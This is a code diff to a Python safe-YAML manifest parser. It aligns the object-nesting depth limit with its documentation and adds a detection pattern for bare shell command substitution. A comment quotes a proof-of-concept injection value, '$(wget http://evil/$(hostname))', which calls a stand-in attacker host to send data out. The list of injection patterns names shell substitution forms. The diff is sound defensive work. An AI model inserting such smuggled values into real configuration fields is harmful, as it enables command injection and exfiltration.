@@ -3,7 +3,7 @@ Yashigani Manifest — Safe YAML parser (M1, M2, M3).
 
 M1 — safe-parse: yaml.safe_load only (no ruamel); 512 KB pre-parse cap;
      sandboxed subprocess via resource.setrlimit (AS 256 MB, CPU 5 s);
-     anchor/alias depth cap 10; & / * count cap ≈ 100 combined.
+     object-graph nesting depth cap 100; & / * count cap ≈ 100 combined.
 
 M2 — tenant_id regex ``^[a-z0-9][a-z0-9-]{1,62}[a-z0-9]$`` + post-interp
      KMS-prefix assertion ``/tenant/<id>/`` for every kms_path field.
@@ -35,9 +35,16 @@ _MAX_MANIFEST_BYTES: int = 512 * 1024
 # Combined & + * count cap (anchor definition + reference).
 _MAX_ANCHOR_ALIAS_COUNT: int = 100
 
-# Maximum nesting depth of anchor/alias in the YAML text (conservative
-# pre-parse heuristic — exact depth is also enforced in _SafeLoadWrapper).
-_MAX_ANCHOR_ALIAS_DEPTH: int = 10
+# Maximum object-graph nesting depth enforced during YAML construction.
+# Applied in _DepthTrackingLoader.construct_object.  Set to 100 to allow
+# reasonable real-world manifests while still bounding billion-laughs-style
+# deep alias trees.
+#
+# F1 (Iris LOW): the previous value was 10 with a silent ``* 10`` multiplier
+# inside _DepthTrackingLoader (actual limit = 100), which made the docstring
+# and the runtime behaviour disagree.  The constant now directly represents
+# the enforced limit.
+_MAX_ANCHOR_ALIAS_DEPTH: int = 100
 
 # Resource limits for the sandboxed subprocess (Linux; no-op on macOS).
 _SANDBOX_AS_BYTES: int = 256 * 1024 * 1024  # 256 MB virtual address space
@@ -133,11 +140,12 @@ class _DepthTrackingLoader(yaml.SafeLoader):
 
     def construct_object(self, node: Any, deep: bool = False) -> Any:
         self._depth += 1
-        if self._depth > _MAX_ANCHOR_ALIAS_DEPTH * 10:
+        if self._depth > _MAX_ANCHOR_ALIAS_DEPTH:
             # Overly deep object graph — reject.
+            # F1: constant now directly represents the limit (no hidden * 10).
             raise ManifestParseError(
                 "M1_nesting_depth",
-                "YAML object nesting depth exceeds limit (%d)" % (_MAX_ANCHOR_ALIAS_DEPTH * 10),
+                "YAML object nesting depth exceeds limit (%d)" % _MAX_ANCHOR_ALIAS_DEPTH,
             )
         try:
             result = super().construct_object(node, deep=deep)
@@ -203,9 +211,15 @@ def _check_shell_bound_fields(parsed: dict) -> None:
 # ---------------------------------------------------------------------------
 
 # Patterns that must NEVER appear literally in any string field value.
-# Property test: inject "; $(cmd)" into every field, assert ManifestParseError.
+# Property test: inject "; $(cmd)" or "$(cmd)" into every field, assert ManifestParseError.
+#
+# F2 (Laura MED): bare "$(...)" without a leading semicolon was previously
+# undetected — PoC: base_url: "$(wget http://evil/$(hostname))" passed all checks.
+# The standalone r"\$\(" pattern must come BEFORE (or alongside) the semicolon-
+# prefixed form so that bare command-substitution strings are also caught.
 _INJECTION_PATTERNS: tuple[re.Pattern, ...] = (
-    re.compile(r";.*\$\("),           # "; $(cmd)" shell substitution
+    re.compile(r"\$\("),              # bare "$(cmd)" command substitution (F2 Laura)
+    re.compile(r";.*\$\("),           # "; $(cmd)" shell substitution (redundant but kept for clarity)
     re.compile(r"\$\{[^}]*\}"),       # "${var}" shell variable expansion
     re.compile(r"`[^`]+`"),           # `backtick` command substitution
     re.compile(r"\|\s*\w"),           # pipe to command
